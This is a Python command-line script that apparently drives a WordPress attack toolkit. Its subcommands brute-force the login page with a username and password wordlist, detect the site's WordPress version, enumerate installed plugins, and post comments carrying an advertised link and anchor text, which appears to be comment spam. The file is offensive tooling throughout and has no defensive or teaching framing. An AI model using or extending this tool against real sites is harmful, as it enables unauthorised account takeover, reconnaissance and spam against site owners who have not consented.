import tools.wplogin
import tools.wpversioncheck
import tools.wpcomment
import tools.wpfindplugins
import argparse


def brute_wp_login(username, wordlist, url):
    bl = tools.wplogin.BruteLogin(username, wordlist, url)
    with open(wordlist, 'r') as file:
        for line in file:
            stripped_line = line.strip('')
            bl.fill_form(stripped_line)
            if bl.submit_form(stripped_line):
                break



def check_version(url):
    vc = tools.wpversioncheck.GetVersion(url)
    print(vc.locate_version())

def post_comment(target, advertise, anchor):
    wpc = tools.wpcomment.WPComment(target, advertise, anchor)
    wpc.post_comment()

def get_plugins(url):
    gp = tools.wpfindplugins.FindPlugins(url)
    list = gp.get_plugins()
    for line in list:
        print(line)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    subparser = parser.add_subparsers(dest='command')
    version = subparser.add_parser('version')
    comment = subparser.add_parser('comment')
    login = subparser.add_parser('brutelogin')
    plugins = subparser.add_parser('plugins')

    version.add_argument('--url', type=str, required=True)

    comment.add_argument('--target', type=str, required=True)
    comment.add_argument('--advertise', type=str, required=True)
    comment.add_argument('--anchor', type=str, required=True)

    login.add_argument('--username', type=str, required=True)
    login.add_argument('--wordlist', type=str, required=True)
    login.add_argument('--url', type=str, required=True)

    plugins.add_argument('--url', type=str, required=True)

    args = parser.parse_args()

    if args.command == 'version':
        check_version(args.url)

    if args.command == 'comment':
        post_comment(args.target, args.advertise, args.anchor)

    if args.command == 'brutelogin':
        brute_wp_login(args.username, args.wordlist, args.url)

    if args.command == 'plugins':
        get_plugins(args.url)